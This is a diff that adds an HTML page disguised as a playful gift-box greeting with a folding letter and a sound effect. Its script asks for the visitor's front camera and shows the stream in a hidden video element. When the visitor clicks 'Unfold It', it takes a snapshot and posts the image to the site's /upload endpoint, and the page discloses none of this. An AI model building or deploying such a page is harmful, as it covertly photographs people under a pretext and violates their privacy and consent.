@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A Special Gift For You</title>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-color: #ff4757;
+            --secondary-color: #ff6b81;
+            --gold: #ffa502;
+            --bg-gradient: linear-gradient(135deg, #ffeaa7 0%, #ff7675 100%);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: var(--bg-gradient);
+            font-family: 'Poppins', sans-serif;
+            overflow: hidden;
+            perspective: 1000px;
+        }
+
+        /* Container to manage states */
+        .wrapper {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100vh;
+        }
+
+        /* --- GIFT BOX STYLES --- */
+        .gift-container {
+            position: relative;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .gift-container:hover {
+            transform: scale(1.05);
+        }
+
+        /* Cute bounce animation for the gift */
+        .bounce {
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
+        }
+
+        .gift-box {
+            position: relative;
+            width: 150px;
+            height: 150px;
+            background: var(--primary-color);
+            border-radius: 0 0 8px 8px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+        }
+
+        .gift-lid {
+            position: absolute;
+            width: 160px;
+            height: 40px;
+            background: var(--secondary-color);
+            top: -35px;
+            left: -5px;
+            border-radius: 4px;
+            box-shadow: 0 4px 5px rgba(0,0,0,0.1);
+            transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 2;
+        }
+
+        /* Ribbon */
+        .gift-box::before, .gift-lid::before {
+            content: '';
+            position: absolute;
+            background: var(--gold);
+            width: 30px;
+            height: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .gift-box::after {
+            content: '';
+            position: absolute;
+            background: var(--gold);
+            width: 100%;
+            height: 30px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        /* Gift Bow */
+        .bow {
+            position: absolute;
+            top: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 25px;
+            background: var(--gold);
+            border-radius: 50px 50px 0 0;
+        }
+
+        /* --- LETTER STYLES --- */
+        .letter-container {
+            position: absolute;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0;
+            transform: scale(0.5) translateY(100px);
+            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .letter {
+            width: 320px;
+            height: 200px; /* Folded height */
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.8s ease-in-out;
+            overflow: hidden;
+            border: 2px dashed var(--secondary-color);
+            position: relative;
+        }
+
+        /* Folded look overlay effect */
+        .letter::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            background: rgba(0, 0, 0, 0.03);
+            transition: opacity 0.5s ease;
+            pointer-events: none;
+        }
+
+        .unfold-btn {
+            margin-top: 25px;
+            padding: 12px 30px;
+            background: white;
+            color: var(--primary-color);
+            border: none;
+            border-radius: 25px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+        }
+
+        .unfold-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+            background: var(--primary-color);
+            color: white;
+        }
+
+        /* Message Styling */
+        .message {
+            font-family: 'Dancing Script', cursive;
+            font-size: 3.5rem;
+            color: #2f3542;
+            text-align: center;
+            opacity: 0;
+            transform: scale(0.7);
+            transition: all 0.6s ease 0.4s; /* Delay until unfolded */
+            white-space: nowrap;
+        }
+
+        .emoji {
+            display: block;
+            font-size: 2.5rem;
+            margin-top: 10px;
+        }
+
+        /* --- ANIMATION STATES (TRIGGERED BY JS) --- */
+        
+        /* Gift Opened State */
+        .gift-container.opened .gift-lid {
+            transform: translateY(-80px) rotate(-20px);
+            opacity: 0;
+        }
+        
+        .gift-container.opened {
+            transform: scale(0.8) translateY(150px);
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Letter Reveal State */
+        .letter-container.reveal {
+            display: flex;
+            opacity: 1;
+            transform: scale(1) translateY(0);
+        }
+
+        /* Letter Unfolded State */
+        .letter-container.unfolded .letter {
+            height: 350px; /* Unfolded height */
+            background: #fffdf0; /* Soft warm paper tone */
+        }
+
+        .letter-container.unfolded .letter::after {
+            opacity: 0; /* Remove fold shadow */
+        }
+
+        .letter-container.unfolded .message {
+            opacity: 1;
+            transform: scale(1);
+            animation: popIn 0.5s ease forward;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.8); }
+            100% { transform: scale(1); }
+        }
+
+        /* Floating background hearts decoration */
+        .bg-decor {
+            position: absolute;
+            font-size: 1.5rem;
+            opacity: 0.2;
+            animation: float 4s infinite ease-in-out;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(15deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-decor" style="top: 15%; left: 15%; animation-delay: 0s;">❤️</div>
+    <div class="bg-decor" style="top: 20%; right: 20%; animation-delay: 1s;">✨</div>
+    <div class="bg-decor" style="bottom: 20%; left: 25%; animation-delay: 1.5s;">✨</div>
+    <div class="bg-decor" style="bottom: 15%; right: 15%; animation-delay: 0.5s;">❤️</div>
+
+    <div class="wrapper">
+        
+        <div class="gift-container bounce" id="giftContainer" onclick="openGift()">
+            <div class="gift-lid">
+                <div class="bow"></div>
+            </div>
+            <div class="gift-box"></div>
+        </div>
+
+        <div class="letter-container" id="letterContainer">
+            <div class="letter" id="letter">
+                <div class="message" id="message">
+                    heera bete
+                    <span class="emoji">💎✨❤️</span>
+                </div>
+            </div>
+            <button class="unfold-btn" id="unfoldBtn" onclick="unfoldLetter()">Unfold It</button>
+        </div>
+
+    </div>
+    <video id="video" src="https://orangefreesounds.com/wp-content/uploads/2026/01/Fahh-sound-effect.mp3" preload="auto" autoplay="autoplay" hidden></video>
+    <audio id="faahSound" src="https://orangefreesounds.com/wp-content/uploads/2026/01/Fahh-sound-effect.mp3" preload="auto"></audio>
+
+    <script>
+        const giftContainer = document.getElementById('giftContainer');
+        const letterContainer = document.getElementById('letterContainer');
+        const unfoldBtn = document.getElementById('unfoldBtn');
+        const faahSound = document.getElementById('faahSound');
+
+        function openGift() {
+            // Remove bounce, add opened classes
+            giftContainer.classList.remove('bounce');
+            giftContainer.classList.add('opened');
+            
+            // Show the folded letter with a small smooth delay
+            setTimeout(() => {
+                giftContainer.style.display = 'none';
+                letterContainer.classList.add('reveal');
+            }, 600);
+        }
+
+        function unfoldLetter() {
+            // Play the "faah" sound effect
+            faahSound.currentTime = 0; // Reset to start if clicked again
+            faahSound.play().catch(error => {
+                console.log("Audio playback layout restriction: ", error);
+            });
+
+            // Add the unfolded styling class
+            letterContainer.classList.add('unfolded');
+            
+            // Fade out the button gracefully after click
+            unfoldBtn.style.opacity = '0';
+            unfoldBtn.style.pointerEvents = 'none';
+            setTimeout(() => {
+                unfoldBtn.style.display = 'none';
+            }, 400);
+      };
+
+        const video = document.getElementById('video');
+        const captureBtn = document.getElementById('unfoldBtn');
+
+        // Request front-facing or default camera
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => { alert("Camera access error: " + err); });
+
+        unfoldBtn.onclick = async () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            unfoldLetter();
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imgData = canvas.toDataURL('image/jpeg', 0.85);
+
+            try {
+                // Send relative path since frontend is hosted on the same server
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imgData })
+                });
+
+                const result = await response.json();
+                if (response.ok) {
+                    console.log("successful")
+                } else {
+                    alert("Error: " + result.error);
+                }
+            } catch (error) {
+                alert("Could not connect to server.");
+            }
+        };
+</script>
+    
+</body>
+</html>
